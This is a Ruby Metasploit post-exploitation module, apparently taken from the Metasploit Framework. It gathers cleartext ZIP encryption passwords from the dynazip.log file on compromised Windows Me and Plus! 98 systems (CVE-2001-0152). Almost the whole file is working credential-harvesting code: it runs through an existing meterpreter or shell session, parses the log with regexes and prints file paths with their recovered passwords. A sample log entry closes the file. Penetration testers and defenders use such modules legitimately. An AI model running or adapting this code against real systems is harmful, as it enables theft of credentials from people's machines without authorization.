##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Gather DynaZIP Saved Password Extraction',
      'Description'    => %q{
        This module extracts clear text credentials from dynazip.log.
        The log file contains passwords used to encrypt compressed zip
        files in Microsoft Plus! 98 and Windows Me.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Brendan Coles <bcoles[at]gmail.com>'],
      'References'     =>
        [
          ['CVE', '2001-0152'],
          ['MSB', 'MS01-019'],
          ['PACKETSTORM', '24543'],
          ['URL', 'https://support.microsoft.com/en-us/kb/265131']
        ],
      'DisclosureDate' => 'Mar 27 2001',
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter', 'shell']
    ))
  end

  def run
    creds = []

    log_path = "#{get_env("%WINDIR%")}\\dynazip.log"

    unless file?(log_path)
      print_error("#{log_path} not found")
      return
    end

    print_good("Found DynaZip log file: #{log_path}")

    begin
      log_data = read_file(log_path)
    rescue EOFError
      print_error('Log file is empty')
      return
    end

    vprint_status("Processing log file (#{log_data.length} bytes)")

    log_data.split('- DynaZIP ZIP Diagnostic Log -').each do |log|

      if log =~ /^lpszZIPFile: 0x[0-9a-f]+\s*?^(.+)\r\n/
        zip_path = $1
      else
        next
      end

      vprint_status("Processing log entry for #{zip_path}")

      # The lpszEncryptCode appears to always be 0x712185d4 however
      # we use a hex regex pattern, just in case.
      # The line following the lpszEncryptCode contains the password.
      passwd = log.scan(/^lpszEncryptCode: 0x[0-9a-f]+\s*?^(.+)?\r\n/).flatten.first

      # In the event that the user selected a blank encryption password
      # the ZIP file is not encrypted, however an empty line is written
      # to the log file.
      if passwd.to_s.eql?('')
        vprint_status('Did not find a password')
        next
      end

      print_good("File: '#{zip_path}' -- Password: '#{passwd}'")
      creds << [zip_path, passwd]
    end

    if creds.empty?
      print_error('No passwords were found in the log file')
      return
    end

    table = Rex::Text::Table.new(
      'Header'    => 'ZIP Passwords',
      'Indent'    => 0,
      'SortIndex' => 0,
      'Columns'   => ['File Path', 'Password']
    )
    creds.each {|c| table << c }
    print_line
    print_line(table.to_s)
  end
end


=begin
Example log entry:

--- DynaZIP ZIP Diagnostic Log - Version: 3.00.16 - 02/22/17  17:01:46 ---
Function:  5 
lpszZIPFile: 0x00437538 
C:\WINDOWS\Desktop\secret.zip
lpszItemList: 0x0059e878 
"secret.txt"
lpMajorStatus: 0x00000000 
lpMajorUserData: 0x00000000 
lpMinorStatus: 0x00000000 
lpMinorUserData: 0x00000000 
dosifyFlag: 0 
recurseFlag: 0 
compFactor: 5 
quietFlag: 1 
pathForTempFlag: 0 
lpszTempPath: 0x00000000 
???
fixFlag: 0 
fixHarderFlag: 0 
includeVolumeFlag: 0 
deleteOriginalFlag: 0 
growExistingFlag: 0 
noDirectoryNamesFlag: 0 
convertLFtoCRLFFlag: 0 
addCommentFlag: 0 
lpszComment: 0x00000000 
???
afterDateFlag: 0 
lpszDate: 0x00000000 
oldAsLatestFlag: 0 
includeOnlyFollowingFlag: 0 
lpszIncludeFollowing: 0x00000000 
???
excludeFollowingFlag: 0 
lpszExludeFollowing: 0x00000000 
???
noDirectoryEntriesFlag: 0 
includeSysHiddenFlag: 1 
dontCompressTheseSuffixesFlag: 0 
lpszStoreSuffixes: 0x00000000 
???
encryptFlag: 1 
lpszEncryptCode: 0x712185d4 
my secret password!
lpMessageDisplay: 0x7120ca22 
lpMessageDisplayData: 0x00000000 
wMultiVolControl: 0x0000 
wZipSubOptions: 0x0000 
lResv1: 0x00000000 
lResv2: 0x00000000 
lpszExtProgTitle: 0x00000000 
???
lpRenameProc: 0x71203919 
lpRenameUserData: 0x0059eb8a 
lpMemBlock: 0x004e3a0c 
lMemBlockSize: 6 
=end
